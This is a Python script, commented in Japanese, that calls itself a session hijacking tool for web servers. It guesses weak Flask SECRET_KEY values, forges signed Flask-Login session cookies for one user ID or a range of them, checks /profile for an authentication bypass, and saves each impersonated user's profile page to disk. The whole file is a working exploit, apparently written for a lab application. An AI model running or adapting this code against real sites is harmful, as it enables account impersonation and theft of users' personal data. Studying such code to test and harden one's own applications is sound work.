import requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
import argparse

# コマンドライン引数の解析
parser = argparse.ArgumentParser(
    description='WEBサーバーに対するセッションハイジャックツール',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog="""
使用例:
  python 001session_hijack.py -u http://localhost:5000
  python 001session_hijack.py --url http://example.com:8080
  python 001session_hijack.py -u http://localhost:5000 -i 2
  python 001session_hijack.py -u http://localhost:5000 -i 1-2
        """
)

parser.add_argument('-u', '--url', 
                   required=True,
                   help='ターゲットURL（必須）')
parser.add_argument('-i',
                   dest='user_id',
                   default='1',
                   help='攻撃対象のユーザーID（デフォルト: 1）。範囲指定可（例: 1-2）')

args = parser.parse_args()

target_url = args.url.rstrip('/')

# ユーザーIDのリストを生成（範囲指定に対応）
def parse_user_ids(user_id_str):
    """ユーザーID文字列をパースしてリストを返す（範囲指定に対応）"""
    if '-' in user_id_str:
        # 範囲指定（例: 1-2）
        try:
            start, end = user_id_str.split('-', 1)
            start = int(start.strip())
            end = int(end.strip())
            if start > end:
                start, end = end, start
            return [str(i) for i in range(start, end + 1)]
        except ValueError:
            print(f"[!] 警告: 無効な範囲指定 '{user_id_str}'。デフォルトのID 1を使用します。")
            return ['1']
    else:
        # 単一のID
        return [user_id_str]

target_user_ids = parse_user_ids(args.user_id)


SECRET_KEYS = [
    "secret",
    "secret-key",
    "testkey",
    "ecre-key",
    "your-secret-key-change-in-production",
    "secret-keys",
]

# 3. 偽造するセッションデータ（後で各IDごとに生成）

# 4. 複数のSECRET_KEYを試す
print("="*80)
print("SECRET_KEYの特定とセッションハイジャック")
print("="*80)
print(f"\n[*] ターゲットURL: {target_url}")
print(f"[*] 攻撃対象のユーザーID: {', '.join(target_user_ids)} (合計{len(target_user_ids)}個)")
print(f"\n[*] 試行するSECRET_KEY候補:")
for i, key in enumerate(SECRET_KEYS, 1):
    print(f"  {i}. {key}")

session = None
fake_cookie = None
used_secret_key = None

# SECRET_KEYを特定
used_secret_key = None
for secret_key in SECRET_KEYS:
    print(f"\n[*] SECRET_KEYを試行: {secret_key}")
    
    # 最初のユーザーIDでテスト
    test_user_id = target_user_ids[0]
    test_fake_session = {
        "_user_id": test_user_id,
        "_fresh": True,
        "_id": test_user_id
    }
    
    # Flaskアプリケーションを作成してセッションシリアライザーを取得
    app = Flask(__name__)
    app.config['SECRET_KEY'] = secret_key
    session_interface = app.session_interface
    serializer = session_interface.get_signing_serializer(app)
    
    # セッションクッキーを生成
    test_cookie = serializer.dumps(test_fake_session)
    
    # テスト用のセッションを作成
    test_session = requests.Session()
    test_session.cookies.set('session', test_cookie)
    
    # プロフィールページにアクセスしてテスト
    test_response = test_session.get(f'{target_url}/profile', allow_redirects=False)
    
    # 成功の判定: 200でプロフィールページが返される、または302でログインページ以外にリダイレクト
    is_success = False
    if test_response.status_code == 200:
        # ログインページが返されていないか確認
        if 'ログイン' not in test_response.text or ('プロフィール' in test_response.text and 'ユーザー名' in test_response.text):
            is_success = True
    elif test_response.status_code == 302:
        redirect_location = test_response.headers.get('Location', '')
        if '/login' not in redirect_location:
            is_success = True
    
    if is_success:
        print(f"  [OK] SECRET_KEY '{secret_key}' が正しいです！")
        used_secret_key = secret_key
        break
    else:
        print(f"  [NG] SECRET_KEY '{secret_key}' では失敗 (ステータス: {test_response.status_code})")

if not used_secret_key:
    print(f"\n[!] 警告: すべてのSECRET_KEYで失敗しました")
    print(f"[!] デフォルトのSECRET_KEY 'your-secret-key-change-in-production' を使用します")
    used_secret_key = SECRET_KEYS[0]

print(f"\n[*] 使用したSECRET_KEY: {used_secret_key}")

# Flaskアプリケーションを設定
app = Flask(__name__)
app.config['SECRET_KEY'] = used_secret_key
session_interface = app.session_interface
serializer = session_interface.get_signing_serializer(app)

# 各ユーザーIDに対してセッションハイジャックを実行
for user_id in target_user_ids:
    print(f"\n{'='*80}")
    print(f"[*] ユーザーID {user_id} でセッションハイジャックを試行中...")
    print(f"{'='*80}")
    
    # 偽造するセッションデータを作成
    fake_session = {
        "_user_id": user_id,
        "_fresh": True,
        "_id": user_id
    }
    
    # セッションクッキーを生成
    fake_cookie = serializer.dumps(fake_session)
    print(f"[*] 偽造したセッションクッキー: {fake_cookie[:60]}...")
    
    # デバッグ: セッションクッキーを検証
    try:
        decoded_session = serializer.loads(fake_cookie)
        print(f"[*] セッションクッキーの検証: 成功")
        print(f"[*] デコードされたセッションデータ: {decoded_session}")
    except Exception as e:
        print(f"[!] セッションクッキーの検証: 失敗 - {e}")
        continue
    
    # セッションを作成
    session = requests.Session()
    session.cookies.set('session', fake_cookie)
    
    # プロフィールページにアクセス
    print(f"\n[*] プロフィールページにアクセス...")
    response = session.get(f'{target_url}/profile', allow_redirects=False)
    print(f"ステータスコード: {response.status_code}")
    
    # リダイレクトの確認
    if response.status_code == 302:
        redirect_location = response.headers.get('Location', '')
        print(f"[*] リダイレクト先: {redirect_location}")
        if '/login' in redirect_location:
            print("[!] ログインページにリダイレクトされました（セッションが無効）")
            if redirect_location.startswith('http'):
                response = session.get(redirect_location, allow_redirects=True)
            else:
                response = session.get(f'{target_url}{redirect_location}', allow_redirects=True)
            print(f"[*] リダイレクト後のステータスコード: {response.status_code}")
    
    # レスポンスの内容を確認
    if response.status_code == 200:
        # ログインページが返されているか確認
        if 'ログイン' in response.text and 'username' in response.text.lower() and '<title>ログイン' in response.text:
            print("[!] 警告: ログインページが返されました（セッションが無効）")
        elif "プロフィール" in response.text and "ユーザー名" in response.text:
            print("[+] 攻撃成功: 認証をバイパスしました")
            print("[+] ユーザーになりすましてアクセスできました")
            
            # HTML情報をtxtファイルに出力（IDごとに別ファイル）
            output_filename = f"profile_page_user_{user_id}.html"
            try:
                with open(output_filename, 'w', encoding='utf-8') as f:
                    f.write(response.text)
                print(f"[*] HTML情報を {output_filename} に出力しました")
            except Exception as e:
                print(f"[!] HTML情報の出力エラー: {e}")
        else:
            print("[!] ステータス200ですが、プロフィールページかどうか不明です")
    else:
        print("[*] 攻撃失敗: 認証が必要です")
